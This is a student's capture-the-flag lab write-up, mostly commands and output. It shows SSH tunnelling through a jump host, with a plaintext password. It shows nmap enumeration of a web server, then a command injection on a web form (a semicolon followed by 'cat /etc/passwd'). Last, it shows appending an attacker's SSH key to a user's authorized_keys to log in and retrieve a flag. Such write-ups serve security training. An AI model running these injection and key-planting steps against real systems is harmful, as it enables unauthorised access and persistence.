### Start of day2 CTF's
```bash
#IP TARGET: 10.100.28.40
#to begin, I ran:
student@lin-ops$ ssh -MS /tmp/jump student@10.50.11.132
PASS: meeMd337xc6j
#Then:
student@lin-ops$ ssh -S /tmp/jump jump -O forward -D9050
student@lin-ops$ nmap 10.100.28.40
#Result:
Nmap scan report for 10.100.28.40
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http #CONFIRMED HTTP
4444/tcp open  krb524 #CONFIRMED SSH
#Next,
student@lin-ops$ ssh -S /tmp/jump jump -O forward -L11111:10.100.28.40:80 -L11112:10.100.28.40:4444
#In firefox:
127.0.0.1:1111 #Brought us to webpage for MI, not of very much use.
student@lin-ops$ proxychains nmap --script=http-enum 10.100.28.40
 PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524
#Robots.txt:
User-agent: *
Disallow: /net_test

#On uploads, I discovered the IP 10.100.28.55
#Discovered in robots.txt "net_test", which led to a trouble ticket link, which led to the finding of "Contract_bids.html, which putting that in led me to find "N.Romanoff@MI.ru
###C OMMAND INJECTION
#We went to the net_test and looked at the send boxes. I selected the second one, and ran
../../../../../../ cat /etc/passwd
#No result
#Ran:
;  cat /etc/passwd
#Revealed Billybob.
student@lin-ops$ cat ~/.ssh/id_rsa.pub
On website**
 ls -la /users/home/directory      #check if .ssh exists
 mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
cat /users/home/directory/.ssh/authorized_keys (Verify)
using our ssh port forward we created earlier*
#ssh billybob@127.0.0.1 -p 11112
billybob@mi$ cd /home
#we did dir, revealed romanoff@mi.ru, cd there, cat contracts, flag revealed.
